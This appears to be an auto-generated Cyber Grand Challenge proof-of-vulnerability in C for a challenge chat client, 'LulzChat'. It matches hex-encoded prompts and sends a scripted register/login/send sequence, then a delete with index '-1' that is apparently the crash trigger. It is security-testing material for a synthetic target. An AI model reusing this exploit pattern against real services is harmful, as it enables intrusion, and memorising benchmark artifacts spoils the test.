#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 58;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x5b\x49\x4e\x46\x4f\x5d\x20\x4c\x75\x6c\x7a\x43\x68\x61\x74\x20"
         "\x43\x6c\x69\x65\x6e\x74\x20\x76\x30\x2e\x31\x0a\x5b\x49\x4e\x46"
         "\x4f\x5d\x20\x54\x79\x70\x65\x20\x27\x68\x27\x20\x66\x6f\x72\x20"
         "\x68\x65\x6c\x70\x20\x6d\x65\x6e\x75\x0a";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 58);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 2;
      read_00001 = (unsigned char*)cgc_malloc(read_00001_len);
      int read_00001_res = cgc_length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00001_00000[] = 
         "\x3e\x20";
      read_00001_ptr += cgc_data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 2);
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x72\x0a\x74\x65\x73\x74\x0a\x74\x65\x73\x74\x0a\x74\x65\x73\x74"
         "\x0a\x6c\x0a\x74\x65\x73\x74\x0a\x74\x65\x73\x74\x0a\x73\x0a\x74"
         "\x65\x73\x74\x0a\x30\x0a\x68\x65\x6c\x6c\x6f\x0a\x64\x0a\x2d\x31"
         "\x0a\x71\x0a\x0a";
      static unsigned int write_00000_00000_len = 52;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length read
      read_00002_len = 376;
      read_00002 = (unsigned char*)cgc_malloc(read_00002_len);
      int read_00002_res = cgc_length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00002_00000[] = 
         "\x0a\x5b\x5b\x5b\x20\x52\x45\x47\x49\x53\x54\x45\x52\x20\x5d\x5d"
         "\x5d\x0a\x2d\x20\x75\x73\x65\x72\x6e\x61\x6d\x65\x3a\x20\x2d\x20"
         "\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x2d\x20\x70\x61\x73\x73"
         "\x77\x6f\x72\x64\x20\x63\x6f\x6e\x66\x69\x72\x6d\x3a\x20\x0a\x5b"
         "\x49\x4e\x46\x4f\x5d\x20\x52\x65\x67\x69\x73\x74\x72\x61\x74\x69"
         "\x6f\x6e\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x21\x20\x28"
         "\x74\x65\x73\x74\x29\x0a\x3e\x20\x0a\x5b\x5b\x5b\x20\x4c\x4f\x47"
         "\x49\x4e\x20\x5d\x5d\x5d\x0a\x2d\x20\x75\x73\x65\x72\x6e\x61\x6d"
         "\x65\x3a\x20\x2d\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x5b"
         "\x49\x4e\x46\x4f\x5d\x20\x4c\x6f\x67\x69\x6e\x20\x53\x75\x63\x63"
         "\x65\x73\x73\x66\x75\x6c\x21\x0a\x3e\x20\x0a\x5b\x5b\x5b\x20\x53"
         "\x45\x4e\x44\x20\x5d\x5d\x5d\x0a\x20\x2d\x20\x54\x6f\x3a\x20\x20"
         "\x2d\x20\x54\x79\x70\x65\x20\x28\x30\x3a\x20\x6e\x6f\x72\x6d\x61"
         "\x6c\x2c\x20\x31\x3a\x20\x70\x72\x6f\x74\x65\x63\x74\x65\x64\x29"
         "\x3a\x20\x20\x2d\x20\x4d\x65\x73\x73\x61\x67\x65\x3a\x20\x0a\x3e"
         "\x20\x0a\x5b\x5b\x5b\x20\x4d\x45\x53\x53\x41\x47\x45\x53\x20\x5d"
         "\x5d\x5d\x0a\x69\x64\x78\x2e\x20\x3c\x66\x72\x6f\x6d\x5f\x69\x64"
         "\x2c\x20\x6c\x65\x6e\x67\x74\x68\x2c\x20\x74\x79\x70\x65\x3e\x0a"
         "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
         "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x0a\x31\x2e\x20"
         "\x3c\x31\x2c\x20\x35\x20\x62\x79\x74\x65\x73\x2c\x20\x4e\x6f\x72"
         "\x6d\x61\x6c\x3e\x0a\x54\x6f\x74\x61\x6c\x20\x31\x20\x6d\x65\x73"
         "\x73\x61\x67\x65\x28\x73\x29\x2e\x0a\x0a\x53\x65\x6c\x65\x63\x74"
         "\x20\x69\x64\x78\x20\x3e\x20\x0a";
      read_00002_ptr += cgc_data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 376);
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
}
